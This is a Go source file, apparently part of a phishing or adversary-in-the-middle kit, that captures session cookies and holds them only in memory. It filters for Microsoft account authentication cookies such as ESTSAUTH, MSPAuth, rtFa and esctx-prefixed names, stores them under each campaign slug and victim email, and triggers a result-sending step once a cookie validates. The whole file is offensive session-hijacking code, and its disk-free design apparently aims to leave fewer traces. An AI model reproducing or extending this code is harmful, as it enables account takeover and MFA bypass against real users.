// capture/save_cookie.go  – DISK-FREE REWRITE
package capture

import (
	"strings"
	"sync"
	"time"
)

/* ───────── data struct ───────── */

type CookieEntry struct {
	Domain         string    `json:"domain"`
	Name           string    `json:"name"`
	Value          string    `json:"value"`
	Path           string    `json:"path"`
	SameSite       string    `json:"sameSite"`
	Secure         bool      `json:"secure"`
	HTTPOnly       bool      `json:"httpOnly"`
	Session        bool      `json:"session"`
	ExpirationDate float64   `json:"expirationDate"`
	Raw            string    `json:"raw"`
	Timestamp      time.Time `json:"ts"`
	Valid          bool      `json:"valid"`
	Slug           string    `json:"slug,omitempty"`
	Email          string    `json:"email,omitempty"`
}

/*
───────── in-memory store ─────────

	key = slug+"|"+email → map[cookieName]CookieEntry
*/
var (
	memMu  sync.Mutex
	cstore = map[string]map[string]CookieEntry{}
)

func storeKey(slug, email string) string { return slug + "|" + email }

/* ───────── filter list ───────── */

var interesting = map[string]bool{
	"ESTSAUTH": true, "ESTSAUTHPERSISTENT": true, "ESTSAUTHLIGHT": true,
	"MSPAuth": true, "MSCC": true, "SPOIDCRL": true,
	"rtFa": true, "MS0Auth": true, "MSPProf": true,
	"SignInStateCookie": true, "RPSAuth": true, "RPSAAUTH": true,
	"OutlookSession": true, "cadata": true,
}

/* ───────── main entry ───────── */

func SaveCookieFor(slug, email string, c CookieEntry) {
	if slug == "" || email == "" || c.Value == "" || !c.Session {
		return
	}
	if !interesting[c.Name] && !strings.HasPrefix(c.Name, "esctx") {
		return
	}

	memMu.Lock()
	m, ok := cstore[storeKey(slug, email)]
	if !ok {
		m = map[string]CookieEntry{}
		cstore[storeKey(slug, email)] = m
	}
	m[c.Name] = c
	memMu.Unlock()

	// fire only for validated cookies
	if c.Valid {
		maybeSendResult(slug, email)
	}
}

/* ───────── access helper for result_builder ───────── */

func getCookiesFor(slug, email string) []CookieEntry {
	memMu.Lock()
	defer memMu.Unlock()
	src := cstore[storeKey(slug, email)]
	out := make([]CookieEntry, 0, len(src))
	for _, v := range src {
		out = append(out, v)
	}
	return out
}

/* ───────── legacy shim ───────── */

func SaveCookie(c CookieEntry) {
	email := GetLastSeenEmail(c.Slug)
	if email == "" {
		return
	}
	SaveCookieFor(c.Slug, email, c)
	if c.Valid {
		maybeSendResult(c.Slug, email)
	}
}
